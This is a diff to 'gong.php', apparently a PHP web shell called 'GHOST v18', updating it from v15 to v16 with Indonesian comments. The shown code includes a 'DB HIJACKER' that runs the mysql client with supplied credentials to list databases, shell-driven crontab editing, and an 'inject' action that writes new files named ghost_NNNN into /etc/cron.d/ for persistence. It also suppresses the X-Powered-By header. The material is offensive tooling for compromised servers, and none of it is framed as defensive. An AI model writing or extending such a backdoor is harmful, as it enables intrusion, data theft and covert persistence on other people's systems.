@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - V15: Cron Manager, UI Fix.
+// GHOST v18 - V16: UI Filter, DB Force Socket.
 
-define('GH_VER',      '18.0.0-v15');
+define('GH_VER',      '18.0.0-v16');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -338,11 +338,11 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
     return $res;
 }
 
-// ==== SECTION 4: THE ABSOLUTE DB HIJACKER (V15) =============================
+// ==== SECTION 4: THE ABSOLUTE DB HIJACKER (V16) =============================
 function gh_db_connect($host, $user, $pass, $socket = null) {
     $host = trim($host); $user = trim($user); $pass = trim($pass);
     
-    // PRIORITAS 1: CLI (Paling Ampuh di Shared Hosting)
+    // PRIORITAS 1: CLI
     if (gh_can_exec()) {
         $cmd = 'mysql ' . ($socket ? '-S ' . @escapeshellarg($socket) : '-h ' . @escapeshellarg($host)) . ' -u ' . @escapeshellarg($user) . ' -p' . @escapeshellarg($pass) . ' -e "SHOW DATABASES" 2>&1';
         $res = gh_exec_adv($cmd);
@@ -1052,12 +1052,10 @@ function gh_cron_action($action, $file, $line, $content) {
     
     if ($action === 'delete') {
         if ($file === 'crontab -l (' . $user . ')') {
-            // Hapus via CLI
             $cmd = "crontab -l | grep -v " . @escapeshellarg($line) . " | crontab -";
             gh_exec_adv($cmd);
             return "Baris dihapus via crontab.";
         } else {
-            // Hapus dari file langsung
             $c = gh_read($file);
             if ($c) {
                 $lines = explode("\n", $c);
@@ -1071,7 +1069,6 @@ function gh_cron_action($action, $file, $line, $content) {
     }
     
     if ($action === 'inject') {
-        // Bikin file cron baru di /etc/cron.d/
         $new_file = '/etc/cron.d/ghost_' . rand(1000,9999);
         if (gh_write($new_file, $content . "\n")) {
             @chmod($new_file, 0644);
@@ -1203,7 +1200,7 @@ function gh_router() {
     }
 }
 
-// ==== UI (TAB NAVIGATION - V15) =============================================
+// ==== UI (TAB NAVIGATION - V16) =============================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
